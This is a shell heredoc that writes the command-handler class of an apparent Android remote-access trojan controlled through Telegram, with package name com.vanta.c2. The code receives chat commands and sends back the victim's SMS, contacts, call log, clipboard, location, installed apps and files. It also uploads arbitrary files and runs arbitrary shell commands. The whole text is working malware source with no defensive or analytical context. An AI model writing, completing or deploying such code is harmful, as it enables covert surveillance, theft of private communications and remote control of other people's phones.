          cat > app/src/main/java/com/vanta/c2/CommandHandler.java <<'VEOF'
          package com.vanta.c2;
          import android.content.Context;
          import android.content.Intent;
          import android.util.Log;
          import java.io.File;
          import java.util.Locale;
          public class CommandHandler {
              private final Context ctx;
              private final TelegramApi api;
              private final DataCollector collector;
              public CommandHandler(Context c, TelegramApi a) { ctx = c; api = a; collector = new DataCollector(c); }
              public void handle(String chatId, String raw) {
                  String[] parts = raw.trim().split("\\s+", 2);
                  String cmd = parts[0].toLowerCase(Locale.US);
                  String arg = parts.length > 1 ? parts[1] : "";
                  new Thread(() -> {
                      try {
                          switch (cmd) {
                              case "/start": case "/help": api.sendMessage(chatId, help()); break;
                              case "/device": api.sendMessage(chatId, collector.getDeviceInfo()); break;
                              case "/battery": api.sendMessage(chatId, "Battery " + collector.getBattery() + "%"); break;
                              case "/wifi": api.sendMessage(chatId, collector.getWifiInfo()); break;
                              case "/sms": api.sendMessage(chatId, collector.getSms()); break;
                              case "/contacts": api.sendMessage(chatId, collector.getContacts()); break;
                              case "/calllog": api.sendMessage(chatId, collector.getCallLog()); break;
                              case "/clipboard": api.sendMessage(chatId, collector.getClipboard()); break;
                              case "/location": api.sendMessage(chatId, collector.getLocation()); break;
                              case "/apps": api.sendMessage(chatId, collector.getInstalledApps()); break;
                              case "/files": api.sendMessage(chatId, collector.listFiles(arg.isEmpty() ? "/sdcard" : arg)); break;
                              case "/download": {
                                  if (arg.isEmpty()) { api.sendMessage(chatId, "/download <path>"); break; }
                                  File f = new File(arg);
                                  if (!f.exists() || !f.isFile()) { api.sendMessage(chatId, "not found"); break; }
                                  if (f.length() > 49L*1024*1024) { api.sendMessage(chatId, ">50MB"); break; }
                                  api.sendDocument(chatId, f, f.getName());
                                  break;
                              }
                              case "/shell":
                                  if (arg.isEmpty()) { api.sendMessage(chatId, "/shell <cmd>"); break; }
                                  api.sendMessage(chatId, collector.runShell(arg));
                                  break;
                              case "/kill":
                                  api.sendMessage(chatId, "bye");
                                  ctx.stopService(new Intent(ctx, BotService.class));
                                  break;
                              default: api.sendMessage(chatId, "unknown\n" + help());
                          }
                      } catch (Exception e) { Log.e("CH", "handle"); }
                  }).start();
              }
              private String help() {
                  return "Commands:\n"
                       + "/device /battery /wifi\n"
                       + "/sms /contacts /calllog\n"
                       + "/clipboard /location /apps\n"
                       + "/files <path>\n"
                       + "/download <path>\n"
                       + "/shell <cmd>\n"
                       + "/kill";
              }
          }
